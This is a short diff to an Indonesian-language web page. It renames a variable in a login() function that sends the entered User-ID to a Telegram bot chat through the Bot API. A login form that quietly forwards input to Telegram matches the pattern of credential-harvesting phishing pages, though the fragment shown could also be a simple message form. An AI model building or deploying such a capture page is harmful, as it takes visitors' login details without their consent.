@@ -123,9 +123,9 @@ LANJUT
 
 <script>
 function login() {
-    const user = document.getElementById("userid").value.trim();
+    const userid = document.getElementById("userid").value.trim();
 
-    if (user === "") {
+    if (userid === "") {
         alert("Masukkan User-ID");
         return;
     }
@@ -135,7 +135,7 @@ function login() {
 
     const pesan = `💌 Pesan baru
 
-Nama: ${nama}`;
+Nama: ${userid}`;
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
